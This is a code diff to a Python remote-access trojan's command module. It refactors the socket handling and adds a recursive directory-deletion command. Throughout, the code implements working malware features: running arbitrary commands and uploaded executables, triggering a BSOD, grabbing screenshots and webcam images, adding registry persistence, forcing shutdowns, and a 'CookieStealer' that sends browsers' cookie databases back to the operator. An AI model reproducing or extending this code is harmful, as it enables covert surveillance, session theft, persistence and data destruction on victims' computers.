@@ -27,39 +27,35 @@ class KillProcess(DoubleCommand):
         import signal
         import os
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
         try:
-            pid = int.from_bytes(tmp_sock.recv(8))
+            pid = int.from_bytes(sock.recv(8))
         except OSError:
             return
         try:
             os.kill(pid, signal.SIGTERM)
-            tmp_sock.sendall("Y".encode("ascii"))
+            sock.sendall("Y".encode("ascii"))
         except PermissionError:
             try:
-                tmp_sock.sendall("N".encode("ascii"))
+                sock.sendall("N".encode("ascii"))
             except OSError:
                 return
         except OSError:
             try:
-                tmp_sock.sendall("?".encode("ascii"))
+                sock.sendall("?".encode("ascii"))
             except OSError:
                 return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
         try:
-            tmp_sock.sendall(params[0].to_bytes(8))
+            client.socket.sendall(params[0].to_bytes(8))
         except TimeoutError:
             return CommandResult(DoubleCommandResult.timeout)
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            success_indicator = tmp_sock.recv(1).decode("ascii")
+            success_indicator = client.socket.recv(1).decode("ascii")
         except OSError:
             print(
                 "Maybe killed process, client did not respond with a success indicator."
@@ -96,14 +92,11 @@ class LaunchExecutableFile(DoubleCommand):
         import random
         import os
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
         exe_contents = bytearray()
         tmp_tries = 0
         while tmp_tries < 3:
             try:
-                tmp_bytes = tmp_sock.recv(1024)
+                tmp_bytes = sock.recv(1024)
             except TimeoutError:
                 break
             exe_contents += tmp_bytes
@@ -116,31 +109,30 @@ class LaunchExecutableFile(DoubleCommand):
             proc = subprocess.Popen(
                 exe_path, creationflags=subprocess.CREATE_NEW_CONSOLE
             )
-            tmp_sock.sendall(str(proc.pid).encode("ascii"))
+            sock.sendall(str(proc.pid).encode("ascii"))
         except TimeoutError:
             return
         except OSError:
             try:
-                tmp_sock.sendall(str(-1).encode("ascii"))
+                sock.sendall(str(-1).encode("ascii"))
             except OSError:
                 return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
         try:
             with open(params[0], "rb") as exe_fd:
-                tmp_sock.sendall(exe_fd.read())
+                client.socket.sendall(exe_fd.read())
         except TimeoutError:
             print(f"Connection to client timeouted...")
             return CommandResult(DoubleCommandResult.timeout)
         except OSError:
-            tmp_sock.send("EXIT".encode("ascii"))
+            client.socket.send("EXIT".encode("ascii"))
             print(f"Error opening file '{params[0]}'.")
             return CommandResult(DoubleCommandResult.param_error)
-        tmp_sock.settimeout(10)
+        client.socket.settimeout(10)
         try:
-            proc_pid = int(tmp_sock.recv(10).decode("ascii"))
+            proc_pid = int(client.socket.recv(10).decode("ascii"))
         except (TypeError, ValueError, OSError):
             proc_pid = None
 
@@ -168,9 +160,6 @@ class InvokeBSOD(DoubleCommand):
         import shared.command_consts
         import subprocess
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
         fail = False
         try:
             subprocess.Popen(shared.command_consts.EXECUTE_B64_BSOD)
@@ -178,17 +167,16 @@ class InvokeBSOD(DoubleCommand):
             fail = True
         try:
             if fail:
-                tmp_sock.sendall("n".encode("ascii"))
+                sock.sendall("n".encode("ascii"))
             else:
-                tmp_sock.sendall("y".encode("ascii"))
+                sock.sendall("y".encode("ascii"))
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
         try:
-            response = tmp_sock.recv(1).decode("ascii")
+            response = client.socket.recv(1).decode("ascii")
         except OSError:
             print(
                 f"Possibly invoked BSOD, client did not respond with a success status."
@@ -221,18 +209,14 @@ class ShowImage(DoubleCommand):
         import PIL.Image
         import io
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            tmp_buf = tmp_sock.recv(4096)
+            tmp_buf = sock.recv(4096)
             img_contents = bytearray(tmp_buf)
         except OSError:
             return
         try:
             while len(tmp_buf) == 4096:
-                tmp_buf = tmp_sock.recv(4096)
+                tmp_buf = sock.recv(4096)
                 img_contents += tmp_buf
         except OSError:
             pass
@@ -251,21 +235,19 @@ class ShowImage(DoubleCommand):
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
             with open(params[0], "rb") as img_file:
                 img_contents = img_file.read()
         except OSError:
             print(f"Error reading file: '{params[0]}'")
             try:
-                tmp_sock.sendall("EXIT".encode("ascii"))
+                client.socket.sendall("EXIT".encode("ascii"))
             except OSError:
                 pass
             return CommandResult(DoubleCommandResult.param_error)
 
         try:
-            tmp_sock.sendall(img_contents)
+            client.socket.sendall(img_contents)
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
 
@@ -287,15 +269,11 @@ class TakeScreenshot(DoubleCommand):
         import PIL.ImageGrab
         import io
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         tmp_io = io.BytesIO()
         PIL.ImageGrab.grab().save(tmp_io, format="PNG")
 
         try:
-            tmp_sock.sendall(tmp_io.getvalue())
+            sock.sendall(tmp_io.getvalue())
         except OSError:
             pass
 
@@ -308,16 +286,15 @@ class TakeScreenshot(DoubleCommand):
             os.mkdir("screenshots")
         except FileExistsError:
             pass
-        tmp_sock = client.create_temp_socket(True, 5)
 
         try:
-            tmp_buf = tmp_sock.recv(4096)
+            tmp_buf = client.socket.recv(4096)
             img_contents = bytearray(tmp_buf)
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
         try:
             while len(tmp_buf) == 4096:
-                tmp_buf = tmp_sock.recv(4096)
+                tmp_buf = client.socket.recv(4096)
                 img_contents += tmp_buf
         except OSError:
             pass
@@ -358,20 +335,16 @@ class TypeWrite(DoubleCommand):
         import threading
         import struct
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            interval = struct.unpack("d", tmp_sock.recv(8))[0]
-            tmp_buf = tmp_sock.recv(1024)
+            interval = struct.unpack("d", sock.recv(8))[0]
+            tmp_buf = sock.recv(1024)
             typewrite_str = bytearray(tmp_buf)
         except OSError:
             return
 
         try:
             while len(tmp_buf) == 1024:
-                tmp_buf = tmp_sock.recv(1024)
+                tmp_buf = sock.recv(1024)
                 typewrite_str += tmp_buf
         except OSError:
             pass
@@ -387,15 +360,13 @@ class TypeWrite(DoubleCommand):
     def server_side(client: "Client", params: tuple) -> CommandResult:
         import struct
 
-        tmp_sock = client.create_temp_socket(True, 5)
-
         corrected_params = params
         if len(params) == 1:
             corrected_params = (params[0], 0)
 
         try:
-            tmp_sock.sendall(struct.pack("d", corrected_params[1]))
-            tmp_sock.sendall(corrected_params[0].encode("ascii"))
+            client.socket.sendall(struct.pack("d", corrected_params[1]))
+            client.socket.sendall(corrected_params[0].encode("ascii"))
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
 
@@ -417,48 +388,42 @@ class RunCommand(DoubleCommand):
     def client_side(sock: socket.socket) -> None:
         import subprocess
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            tmp_buf = tmp_sock.recv(512)
+            tmp_buf = sock.recv(512)
             command = bytearray(tmp_buf)
         except OSError:
             return
 
         try:
             while len(tmp_buf) == 512:
-                tmp_buf = tmp_sock.recv(512)
+                tmp_buf = sock.recv(512)
                 command += tmp_buf
         except OSError:
             pass
 
         try:
             subprocess.Popen(command.decode("ascii"))
-            tmp_sock.sendall("y".encode("ascii"))
+            sock.sendall("y".encode("ascii"))
         except OSError:
             try:
-                tmp_sock.sendall("n".encode("ascii"))
+                sock.sendall("n".encode("ascii"))
             except OSError:
                 pass
         except UnicodeDecodeError:
             try:
-                tmp_sock.sendall("?".encode("ascii"))
+                sock.sendall("?".encode("ascii"))
             except OSError:
                 pass
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
-            tmp_sock.sendall(params[0].encode("ascii"))
+            client.socket.sendall(params[0].encode("ascii"))
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            success_indicator = tmp_sock.recv(1).decode("ascii", "ignore")
+            success_indicator = client.socket.recv(1).decode("ascii", "ignore")
         except (OSError, UnicodeDecodeError):
             print("Sent command, but client did not respond with a success status.")
             return CommandResult(DoubleCommandResult.semi_success)
@@ -494,15 +459,11 @@ class CaptureWebcamImage(DoubleCommand):
         import numpy
         import cv2
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         capture = cv2.VideoCapture(0)
 
         if not capture.isOpened():
             try:
-                tmp_sock.sendall("n".encode("ascii"))
+                sock.sendall("n".encode("ascii"))
             except OSError:
                 pass
             return
@@ -511,7 +472,7 @@ class CaptureWebcamImage(DoubleCommand):
 
         if not success:
             try:
-                tmp_sock.sendall("f".encode("ascii"))
+                sock.sendall("f".encode("ascii"))
             except OSError:
                 pass
             return
@@ -522,18 +483,18 @@ class CaptureWebcamImage(DoubleCommand):
             image_bytes = numpy.array(cv2.imencode(".png", frame)[1]).tobytes()
         except Exception:
             try:
-                tmp_sock.sendall("?".encode("ascii"))
+                sock.sendall("?".encode("ascii"))
             except OSError:
                 pass
             return
 
         try:
-            tmp_sock.sendall("y".encode("ascii"))
+            sock.sendall("y".encode("ascii"))
         except OSError:
             pass
 
         try:
-            tmp_sock.sendall(image_bytes)
+            sock.sendall(image_bytes)
         except OSError:
             pass
 
@@ -546,10 +507,9 @@ class CaptureWebcamImage(DoubleCommand):
             os.mkdir("webcam_images")
         except FileExistsError:
             pass
-        tmp_sock = client.create_temp_socket(True, 5)
 
         try:
-            success_indicator = tmp_sock.recv(1).decode("ascii", "ignore")
+            success_indicator = client.socket.recv(1).decode("ascii", "ignore")
         except OSError:
             print("Client failed to respond with a success indicator.")
             return CommandResult(DoubleCommandResult.conn_error)
@@ -571,14 +531,14 @@ class CaptureWebcamImage(DoubleCommand):
                 return CommandResult(DoubleCommandResult.failure)
 
         try:
-            tmp_buf = tmp_sock.recv(4096)
+            tmp_buf = client.socket.recv(4096)
             img_contents = bytearray(tmp_buf)
         except OSError:
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
             while len(tmp_buf) == 4096:
-                tmp_buf = tmp_sock.recv(4096)
+                tmp_buf = client.socket.recv(4096)
                 img_contents += tmp_buf
         except OSError:
             pass
@@ -623,14 +583,10 @@ class AddPersistence(DoubleCommand):
 
         def bail(msg: str) -> None:
             try:
-                tmp_sock.sendall(msg.encode("ascii"))
+                sock.sendall(msg.encode("ascii"))
             except OSError:
                 pass
             shutil.rmtree(folder_path, ignore_errors=True)
-
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
 
         key_name = "C3Persistence"
         folder_name = key_name
@@ -693,17 +649,15 @@ class AddPersistence(DoubleCommand):
             bail("REG_ERR")
             return
         try:
-            tmp_sock.sendall(folder_path.encode("ascii"))
+            sock.sendall(folder_path.encode("ascii"))
         except OSError:
             pass
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 60)
-
         try:
             install_path = (
-                tmp_sock.recv(128).decode("ascii", "ignore").replace("/", "\\")
+                client.socket.recv(128).decode("ascii", "ignore").replace("/", "\\")
             )
         except OSError:
             print("Client did not respond with a success indicator.")
@@ -742,28 +696,22 @@ class Reboot(DoubleCommand):
             time.sleep(delay_in_ms / 1000)
             subprocess.Popen(["shutdown", "/f", "/r", "/t", "0"])
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
             threading.Thread(
                 target=delayed_reboot,
                 name="Delayed Reboot",
-                args=[int.from_bytes(tmp_sock.recv(8))],
+                args=[int.from_bytes(sock.recv(8))],
             ).start()
         except OSError:
             pass
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         if len(params) == 0:
             params = (0,)
 
         try:
-            tmp_sock.sendall(round(params[0] * 1000).to_bytes(8))
+            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
         except OSError:
             print(f"Failed to send delay time to client.")
             return CommandResult(DoubleCommandResult.conn_error)
@@ -793,28 +741,22 @@ class Shutdown(DoubleCommand):
             time.sleep(delay_in_ms * 1000)
             subprocess.Popen(["shutdown", "/f", "/s", "/t", "0"])
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
             threading.Thread(
                 target=delayed_shutdown,
                 name="Delayed Shutdown",
-                args=[int.from_bytes(tmp_sock.recv(8))],
+                args=[int.from_bytes(sock.recv(8))],
             ).start()
         except OSError:
             pass
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         if len(params) == 0:
             params = (0,)
 
         try:
-            tmp_sock.sendall(round(params[0] * 1000).to_bytes(8))
+            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
         except OSError:
             print(f"Failed to send delay time to client.")
             return CommandResult(DoubleCommandResult.conn_error)
@@ -890,10 +832,6 @@ class CookieStealer(DoubleCommand):
     def client_side(sock: socket.socket) -> None:
         import os
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         LOCAL = os.getenv("LOCALAPPDATA")
         if LOCAL == None:
             return
@@ -916,10 +854,10 @@ class CookieStealer(DoubleCommand):
             try:
                 with open(path, "rb") as cookies_file:
                     cookies_sql = cookies_file.read()
-                    tmp_sock.sendall(len(browser_name).to_bytes(8))
-                    tmp_sock.sendall(len(cookies_sql).to_bytes(8))
-                    tmp_sock.sendall(browser_name.encode("ascii"))
-                    tmp_sock.sendall(cookies_sql)
+                    sock.sendall(len(browser_name).to_bytes(8))
+                    sock.sendall(len(cookies_sql).to_bytes(8))
+                    sock.sendall(browser_name.encode("ascii"))
+                    sock.sendall(cookies_sql)
             except OSError:
                 continue
 
@@ -942,20 +880,18 @@ class CookieStealer(DoubleCommand):
             target_folder = f"cookies/{tmpname}"
             os.mkdir(target_folder)
 
-        tmp_sock = client.create_temp_socket(True, 5)
-
         is_first_run = True
         while True:
             try:
-                lengths = tmp_sock.recv(16)
+                lengths = client.socket.recv(16)
                 name_length = int.from_bytes(lengths[:8])
                 db_length = int.from_bytes(lengths[8:])
                 filename = (
-                    tmp_sock.recv(name_length)
+                    client.socket.recv(name_length)
                     .decode("ascii", "ignore")
                     .translate(str.maketrans({char: "" for char in '\\/*?<>:|"'}))
                 )
-                cookies_db = tmp_sock.recv(db_length)
+                cookies_db = client.socket.recv(db_length)
                 try:
                     with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
                         cookies_db_fd.write(cookies_db)
@@ -984,13 +920,9 @@ class CookieStealer(DoubleCommand):
 class UploadFile(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            destination = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
-            file_contents = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
+            destination = sock.recv(int.from_bytes(sock.recv(8)))
+            file_contents = sock.recv(int.from_bytes(sock.recv(8)))
         except OSError:
             return
 
@@ -1004,15 +936,13 @@ class UploadFile(DoubleCommand):
             response = "?"
 
         try:
-            tmp_sock.sendall(response.encode("ascii"))
+            sock.sendall(response.encode("ascii"))
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
         import os
-
-        tmp_sock = client.create_temp_socket(True, 5)
 
         if not os.path.isfile(params[0]):
             print(f"File '{params[0]} not found")
@@ -1021,16 +951,16 @@ class UploadFile(DoubleCommand):
         with open(params[0], "rb") as file_to_send:
             try:
                 file_contents = file_to_send.read()
-                tmp_sock.sendall(len(params[1]).to_bytes(8))
-                tmp_sock.sendall(params[1].encode("ascii"))
-                tmp_sock.sendall(len(file_contents).to_bytes(8))
-                tmp_sock.sendall(file_contents)
+                client.socket.sendall(len(params[1]).to_bytes(8))
+                client.socket.sendall(params[1].encode("ascii"))
+                client.socket.sendall(len(file_contents).to_bytes(8))
+                client.socket.sendall(file_contents)
             except OSError:
                 print("Connection error whilst trying to send file")
                 return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            success_indicator = tmp_sock.recv(1).decode("ascii")
+            success_indicator = client.socket.recv(1).decode("ascii")
         except OSError:
             print("Sent file but client did not respond with a success indicator")
             return CommandResult(DoubleCommandResult.semi_success)
@@ -1067,12 +997,8 @@ class UploadFile(DoubleCommand):
 class DownloadFile(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            source = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
+            source = sock.recv(int.from_bytes(sock.recv(8)))
         except OSError:
             return
 
@@ -1088,31 +1014,29 @@ class DownloadFile(DoubleCommand):
             response = "?"
 
         try:
-            tmp_sock.sendall(response.encode("ascii"))
+            sock.sendall(response.encode("ascii"))
         except OSError:
             pass
 
         if response != "y":
             return
         try:
-            tmp_sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
-            tmp_sock.sendall(file_contents)  # type: ignore
+            sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
+            sock.sendall(file_contents)  # type: ignore
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
-            tmp_sock.sendall(len(params[0]).to_bytes(8))
-            tmp_sock.sendall(params[0].encode("ascii"))
+            client.socket.sendall(len(params[0]).to_bytes(8))
+            client.socket.sendall(params[0].encode("ascii"))
         except OSError:
             print("Connection error whilst trying to send source file path")
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            success_indicator = tmp_sock.recv(1).decode("ascii")
+            success_indicator = client.socket.recv(1).decode("ascii")
         except OSError:
             print("Asked for file but client did not respond with a success indicator")
             return CommandResult(DoubleCommandResult.semi_success)
@@ -1120,7 +1044,9 @@ class DownloadFile(DoubleCommand):
         match success_indicator:
             case "y":
                 try:
-                    file_contents = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
+                    file_contents = client.socket.recv(
+                        int.from_bytes(client.socket.recv(8))
+                    )
                 except OSError:
                     print("Connection error whilst trying to recieve file contents")
                     return CommandResult(DoubleCommandResult.conn_error)
@@ -1167,24 +1093,16 @@ class OpenURL(DoubleCommand):
     def client_side(sock: socket.socket) -> None:
         import webbrowser
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            webbrowser.open(
-                tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode("ascii")
-            )
+            webbrowser.open(sock.recv(int.from_bytes(sock.recv(8))).decode("ascii"))
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
-            tmp_sock.sendall(len(params[0]).to_bytes(8))
-            tmp_sock.sendall(params[0].encode("ascii"))
+            client.socket.sendall(len(params[0]).to_bytes(8))
+            client.socket.sendall(params[0].encode("ascii"))
         except OSError:
             print("Connection error whilst sending url to client")
             return CommandResult(DoubleCommandResult.failure)
@@ -1206,14 +1124,8 @@ class ListDirectory(DoubleCommand):
     def client_side(sock: socket.socket) -> None:
         import os
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            path = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode(
-                "utf-8", "ignore"
-            )
+            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
         except OSError:
             return
 
@@ -1226,25 +1138,23 @@ class ListDirectory(DoubleCommand):
                 items.append(f"<FILE> -> {item}")
         output = "\n".join(items).encode("utf-8")
         try:
-            tmp_sock.sendall(len(output).to_bytes(8))
-            tmp_sock.sendall(output)
+            sock.sendall(len(output).to_bytes(8))
+            sock.sendall(output)
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
             path = params[0].encode("utf-8")
-            tmp_sock.sendall(len(path).to_bytes(8))
-            tmp_sock.sendall(path)
+            client.socket.sendall(len(path).to_bytes(8))
+            client.socket.sendall(path)
         except OSError:
             print("Failed to send path to client")
             return CommandResult(DoubleCommandResult.conn_error)
 
         try:
-            contents = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode(
+            contents = client.socket.recv(int.from_bytes(client.socket.recv(8))).decode(
                 "utf-8", "ignore"
             )
             print(contents)
@@ -1266,14 +1176,8 @@ class MakeDirectory(DoubleCommand):
     def client_side(sock: socket.socket) -> None:
         import os
 
-        tmp_sock = sock.dup()
-        tmp_sock.setblocking(True)
-        tmp_sock.settimeout(5)
-
         try:
-            path = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode(
-                "utf-8", "ignore"
-            )
+            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
         except OSError:
             return
 
@@ -1291,24 +1195,22 @@ class MakeDirectory(DoubleCommand):
             status = "y"
 
         try:
-            tmp_sock.sendall(status.encode("utf-8"))
+            sock.sendall(status.encode("utf-8"))
         except OSError:
             return
 
     @staticmethod
     def server_side(client: "Client", params: tuple) -> CommandResult:
-        tmp_sock = client.create_temp_socket(True, 5)
-
         try:
             path = params[0].encode("utf-8")
-            tmp_sock.sendall(len(path).to_bytes(8))
-            tmp_sock.sendall(path)
+            client.socket.sendall(len(path).to_bytes(8))
+            client.socket.sendall(path)
         except OSError:
             print("Failed to send path to client")
             return CommandResult(DoubleCommandResult.failure)
 
         try:
-            status = tmp_sock.recv(1).decode("utf-8", "ignore")
+            status = client.socket.recv(1).decode("utf-8", "ignore")
         except OSError:
             print("Sent path, but client did not respond with a success indicator")
             return CommandResult(DoubleCommandResult.semi_success)
@@ -1328,6 +1230,75 @@ class MakeDirectory(DoubleCommand):
                 return CommandResult(DoubleCommandResult.failure)
             case "y":
                 print("Successfully created directory")
+                return CommandResult(DoubleCommandResult.success)
+            case _:
+                print(
+                    "Sent path, but client did not respond with a valid success indicator"
+                )
+                return CommandResult(DoubleCommandResult.semi_success)
+
+
+@add_double_command(
+    "rmdir",
+    "rmdir [ directory path ]",
+    "Recursively deletes a directory on the client",
+    [ArgumentType.string],
+    EmptyReturn,
+)
+class DeleteDirectory(DoubleCommand):
+    @staticmethod
+    def client_side(sock: socket.socket) -> None:
+        import shutil
+
+        try:
+            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
+        except OSError:
+            return
+
+        try:
+            shutil.rmtree(path)
+        except PermissionError:
+            status = "p"
+        except FileNotFoundError:
+            status = "d"
+        except OSError:
+            status = "n"
+        else:
+            status = "y"
+
+        try:
+            sock.sendall(status.encode("utf-8"))
+        except OSError:
+            return
+
+    @staticmethod
+    def server_side(client: "Client", params: tuple) -> CommandResult:
+        try:
+            path = params[0].encode("utf-8")
+            client.socket.sendall(len(path).to_bytes(8))
+            client.socket.sendall(path)
+        except OSError:
+            print("Failed to send path to client")
+            return CommandResult(DoubleCommandResult.failure)
+
+        try:
+            status = client.socket.recv(1).decode("utf-8", "ignore")
+        except OSError:
+            print("Sent path, but client did not respond with a success indicator")
+            return CommandResult(DoubleCommandResult.semi_success)
+
+        match status:
+            case "n":
+                print("There was an error when deleting the directory")
+                return CommandResult(DoubleCommandResult.failure)
+            case "d":
+                print("Directory doesn't exist")
+                return CommandResult(DoubleCommandResult.failure)
+            case "p":
+                print("The client does not have permission to remove such directory")
+                return CommandResult(DoubleCommandResult.failure)
+            case "y":
+                print("Successfully deleted directory")
                 return CommandResult(DoubleCommandResult.success)
             case _:
                 print(
